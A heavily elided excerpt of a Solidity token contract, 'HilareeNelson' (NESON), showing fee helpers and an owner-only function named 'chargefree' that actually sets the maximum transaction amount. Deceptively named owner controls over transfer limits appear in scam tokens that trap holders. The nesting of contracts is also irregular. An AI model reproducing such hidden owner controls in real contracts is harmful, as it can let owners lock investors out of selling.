...
contract Ownable is Context, DividendManage {
    ...
    contract HilareeNelson is Context, IERC20, Ownable {
    using SafeMath for uint256;
    ...
    string private _name = "HilareeNelson";
    string private _symbol = "NESON";
    ...
    function limitfee(uint256 _amount, uint256 _taxFee) private pure returns (uint256) {
			return _amount.mul(_taxFee).div(
				10**2
			);
		}

	function dividedAdd(uint256 _amount, uint256 _liquidityFee) private pure returns (uint256) {
    ...
    function chargefree(uint256 amount) external onlyOwner {
        _maxTxAmount = amount;
    }
